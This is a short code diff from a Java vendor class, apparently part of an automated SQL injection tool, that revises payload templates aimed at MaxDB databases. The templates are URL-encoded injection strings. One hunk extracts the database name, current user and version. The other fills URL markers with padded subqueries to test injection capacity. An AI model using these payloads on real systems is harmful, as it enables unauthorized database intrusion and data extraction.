@@ -13,7 +13,7 @@ public class MaxDbVendor extends AbstractVendor {
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+'-'||id||'%04'||DATABASE()||'%04'||user()||'%04'||'%3F'||'%01%03%03%07'r+from+sysinfo.VERSION";
+            "SELECT+'-'||id||'%04'||DATABASE()||'%04'||user()||'%01%03%03%07'r+from+sysinfo.VERSION";
     }
 
     @Override
@@ -67,7 +67,7 @@ public class MaxDbVendor extends AbstractVendor {
     @Override
     public String getSqlIndicesCapacityCheck(String[] indexes) {
         return
-            MediatorModel.model().indexesInUrl.replaceAll(
+            MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select'SQLi$1'||rpad('%23',1024,'%23',1025)||'iLQS'from+dual)"
             );
